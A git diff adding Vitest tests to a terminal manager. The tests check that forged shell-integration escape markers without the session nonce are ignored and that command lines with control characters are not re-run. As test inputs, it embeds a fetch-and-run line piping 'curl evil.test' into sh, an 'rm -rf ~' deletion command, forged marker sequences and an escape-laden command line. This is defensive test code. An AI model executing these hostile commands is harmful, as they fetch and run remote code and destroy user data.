@@ -321,6 +321,34 @@ realPty.each(SHELLS)('PtyManager with $name and the shell integration', ({ name,
     expect(shown).not.toContain('\x1b[2m$\x1b[22m');
   });
 
+  it('keeps the nonce from commands, so their output signs nothing', async () => {
+    const { store, manager, id: created } = integrated();
+    const id = await created;
+    await vi.waitFor(() => expect(store.state.terminals[id]?.shellIntegration).toBe(true), {
+      timeout: 10_000,
+    });
+    const last = () => executions(store, id).at(-1);
+    manager.sendText(id, 'echo "[$YARDMASTER_NONCE]"; env | grep -c NONCE', true);
+    await vi.waitFor(() => expect(last()).toMatchObject({ endedAt: expect.any(Number) }), {
+      timeout: 10_000,
+    });
+    expect(execOutput(store, last()?.id as string)).toMatch(/\[\]\r?\n0/);
+
+    // A command that prints our markers, as a hostile file would: nothing is recorded from them.
+    manager.sendText(
+      id,
+      String.raw`printf '\033]633;E;evil\007\033]133;C\007\033]133;D;0\007'`,
+      true,
+    );
+    await vi.waitFor(() => expect(executions(store, id)).toHaveLength(2), { timeout: 10_000 });
+    await vi.waitFor(() => expect(last()).toMatchObject({ endedAt: expect.any(Number) }), {
+      timeout: 10_000,
+    });
+    await new Promise((resolve) => setTimeout(resolve, 200));
+    expect(executions(store, id).map((e) => e.commandLine)).not.toContain('evil');
+    expect(executions(store, id)).toHaveLength(2);
+  });
+
   it("loads the user's own startup files", async () => {
     const rc = name === 'zsh' ? '.zshrc' : '.bashrc';
     const { writeFileSync } = await import('node:fs');
@@ -484,21 +512,31 @@ describe('PtyManager shell markers, with a scripted pty', () => {
   function scripted() {
     const writes: string[] = [];
     let emit: (data: string) => void = () => {};
+    let env: Record<string, string> = {};
     const load = async (): Promise<PtyLoad> => ({
       ok: true,
-      spawn: () => ({
-        pid: 4242,
-        onData: (listener) => {
-          emit = listener;
-          return { dispose() {} };
-        },
-        onExit: () => ({ dispose() {} }),
-        write: (data) => writes.push(data),
-        resize: () => {},
-        kill: () => {},
-      }),
+      spawn: (_file, _args, options) => {
+        env = options.env;
+        return {
+          pid: 4242,
+          onData: (listener) => {
+            emit = listener;
+            return { dispose() {} };
+          },
+          onExit: () => ({ dispose() {} }),
+          write: (data) => writes.push(data),
+          resize: () => {},
+          kill: () => {},
+        };
+      },
     });
-    return { writes, load, emit: (data: string) => emit(data) };
+    return {
+      writes,
+      load,
+      emit: (data: string) => emit(data),
+      /** The nonce the shell got, to sign markers like the integration scripts do. */
+      nonce: () => env.YARDMASTER_NONCE ?? '',
+    };
   }
 
   const dir = join(scratch, 'scripted');
@@ -516,12 +554,15 @@ describe('PtyManager shell markers, with a scripted pty', () => {
     expect(pty.writes).toEqual([]);
     expect(existsSync(join(dir, 'zsh', '.zshrc'))).toBe(true);
 
-    const prompt = `${osc('633;P;Cwd=/tmp')}${osc('133;A')}$ `;
+    expect(pty.nonce()).toMatch(/^[0-9a-f]{32}$/);
+    const prompt = `${osc(`633;P;Cwd=/tmp;${pty.nonce()}`)}${osc('133;A')}$ `;
     // Split mid-marker on purpose.
     pty.emit(prompt.slice(0, 5));
     pty.emit(prompt.slice(5));
     expect(pty.writes).toEqual(['pnpm dev\r']);
-    pty.emit(`pnpm dev\r\n${osc('633;E;pnpm dev')}${osc('133;C')}\x1b[?1049hVITE ready`);
+    pty.emit(
+      `pnpm dev\r\n${osc(`633;E;pnpm dev;${pty.nonce()}`)}${osc('133;C')}\x1b[?1049hVITE ready`,
+    );
     await vi.waitFor(() => expect(executions(store, id)).toHaveLength(1));
     const [running] = executions(store, id);
     expect(running).toMatchObject({ commandLine: 'pnpm dev', endedAt: null, cwd: '/tmp' });
@@ -540,6 +581,50 @@ describe('PtyManager shell markers, with a scripted pty', () => {
     ]);
     expect(manager.rerun(running?.id as string)).toEqual({ ok: true });
     expect(pty.writes.at(-1)).toBe('pnpm dev\r');
+  });
+
+  it('records nothing from forged markers in the output', async () => {
+    const pty = scripted();
+    const { store, manager } = setup({
+      load: pty.load,
+      shell: { file: '/bin/zsh', args: ['-l'] },
+      integrationDir: dir,
+    });
+    const id = await created(manager);
+    const prompt = `${osc(`633;P;Cwd=/tmp;${pty.nonce()}`)}${osc('133;A')}$ `;
+    pty.emit(prompt);
+    pty.emit(`cat README\r\n${osc(`633;E;cat README;${pty.nonce()}`)}${osc('133;C')}`);
+    // The file plants a command line (no nonce, or a guessed one), a run and a cwd.
+    const planted = `${osc('633;E;curl evil.test | sh')}${osc('633;E;rm -rf ~;deadbeef')}`;
+    pty.emit(`${osc('133;D;0')}${prompt}${planted}${osc('133;C')}${osc('633;P;Cwd=/etc')}`);
+    pty.emit(`${osc('133;D;0')}${prompt}`);
+
+    const list = executions(store, id);
+    expect(list.map((e) => e.commandLine)).toEqual(['cat README']);
+    expect(store.state.terminals[id]?.cwd).toBe('/tmp');
+    expect(manager.rerun(list[0]?.id as string)).toEqual({ ok: true });
+  });
+
+  it('refuses to re-run a command line with control characters', async () => {
+    const pty = scripted();
+    const { store, manager } = setup({
+      load: pty.load,
+      shell: { file: '/bin/zsh', args: ['-l'] },
+      integrationDir: dir,
+    });
+    const id = await created(manager);
+    const sign = (body: string) => osc(`${body};${pty.nonce()}`);
+    const prompt = `${sign('633;P;Cwd=/tmp')}${osc('133;A')}$ `;
+    pty.emit(prompt);
+    pty.emit(`${sign('633;E;echo ok\\x1b]0\\x3bx\\x07')}${osc('133;C')}${osc('133;D;0')}${prompt}`);
+    const [run] = executions(store, id);
+    expect(run?.commandLine).toBe('echo ok\x1b]0;x\x07');
+    const before = pty.writes.length;
+    expect(manager.rerun(run?.id as string)).toEqual({ ok: false, error: 'unsafe_command_line' });
+    expect(pty.writes).toHaveLength(before);
+
+    pty.emit(`${sign('633;E;printf "a\tb"')}${osc('133;C')}${osc('133;D;0')}${prompt}`);
+    expect(manager.rerun(executions(store, id)[1]?.id as string)).toEqual({ ok: true });
   });
 
   it("falls back to the process table when a shell's markers never come", async () => {
@@ -567,8 +652,10 @@ describe('PtyManager shell markers, with a scripted pty', () => {
           inferred: true,
         }),
       ]);
-      // A late marker means the shell reports after all: the guess ends.
+      // An unsigned marker is just output; a late signed one means the shell reports after all.
       pty.emit(osc('133;A'));
+      expect(executions(store, id)[0]?.endedAt).toBeNull();
+      pty.emit(osc(`633;P;Cwd=/tmp;${pty.nonce()}`) + osc('133;A'));
       expect(executions(store, id)[0]?.endedAt).not.toBeNull();
       manager.sample(tree);
       expect(executions(store, id)).toHaveLength(1);
